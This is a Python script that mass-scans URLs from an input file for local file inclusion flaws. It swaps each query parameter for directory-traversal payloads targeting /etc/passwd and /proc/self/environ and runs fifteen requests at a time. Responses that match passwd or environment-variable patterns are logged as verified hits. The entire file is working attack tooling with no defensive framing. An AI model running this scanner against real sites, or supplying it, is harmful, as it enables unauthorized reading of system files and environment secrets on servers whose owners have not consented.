import asyncio
import aiohttp
import re
import sys
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse

INPUT_FILE = sys.argv[1]

LFI_TARGETS = [
    "../../../../../../../../../../etc/passwd",
    "../../../../../../../../../../proc/self/environ"
]

LOG_VERIFIED = "lfi_verified.txt"
LOG_POTENTIAL = "lfi_potential.txt"

PATTERNS = [
    r"root:x:0:0:",
    r"PATH=/"
]

SEM = asyncio.Semaphore(15)


def mutate_params(url: str):
    parsed = urlparse(url)

    params = parse_qsl(parsed.query, keep_blank_values=True)
    if not params:
        return []

    mutated_urls = []

    for key, val in params:
        for payload in LFI_TARGETS:
            new_params = []
            for k2, v2 in params:
                if k2 == key:
                    new_params.append((k2, payload))
                else:
                    new_params.append((k2, v2))

            new_query = urlencode(new_params)
            new_url = urlunparse(parsed._replace(query=new_query))
            mutated_urls.append(new_url)

    return mutated_urls


async def fetch(session, url):
    try:
        async with SEM:
            async with session.get(url, timeout=8) as r:
                body = await r.text(errors="ignore")
                return r.status, body
    except:
        return None, None


def verified(body):
    if not body:
        return False
    return any(re.search(p, body) for p in PATTERNS)


async def worker(session, url):
    for murl in mutate_params(url):
        status, body = await fetch(session, murl)

        if not status:
            continue
        
        if status in (200, 204):
            with open(LOG_POTENTIAL, "a") as f:
                f.write(murl + "\n")

        if verified(body):
            with open(LOG_VERIFIED, "a") as f:
                f.write(murl + "\n")


async def main():
    with open(INPUT_FILE) as f:
        urls = [x.strip() for x in f if x.strip()]

    async with aiohttp.ClientSession() as session:
        await asyncio.gather(*(worker(session, u) for u in urls))


if __name__ == "__main__":
    asyncio.run(main())
